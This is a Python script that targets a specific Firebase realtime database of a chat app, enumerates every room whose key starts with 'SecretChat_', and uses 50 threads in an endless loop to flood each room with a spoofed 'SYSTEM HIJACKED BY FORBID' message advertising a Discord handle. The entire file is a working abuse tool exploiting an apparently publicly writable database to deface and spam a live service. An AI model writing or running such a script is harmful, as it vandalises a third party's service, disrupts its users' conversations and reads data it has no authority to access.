import time
import requests
from concurrent.futures import ThreadPoolExecutor

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] 200-IQ Global Broadcaster Initialized...")

session = requests.Session()

def blast_room(room_url):
    try:
        payload = {
            "Sender": "FORBID",
            "Message": "SYSTEM HIJACKED BY FORBID, DISCORD: forbiddenway",
            "Timestamp": int(time.time() * 1000),
            "Aura": "voidWings",
            "Color": "red"
        }
        session.post(room_url, json=payload, headers=headers, timeout=2)
    except Exception:
        pass

while True:
    try:
        # Fetch all active rooms instantly
        root_response = session.get(f"{database_url}/.json", timeout=5)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                room_urls = [
                    f"{database_url}/{key}.json" 
                    for key in data.keys() 
                    if key.startswith("SecretChat_")
                ]
                
                # Use multi-threading to hit every server room at the exact same time
                if room_urls:
                    with ThreadPoolExecutor(max_workers=50) as executor:
                        executor.map(blast_room, room_urls)
                    print(f"[FORBID] Broadcast wave sent to {len(room_urls)} rooms!")
                    
    except Exception as e:
        print(f"[FORBID] Broadcast error: {e}")
        
    # Zero lag loop
    time.sleep(0.05)
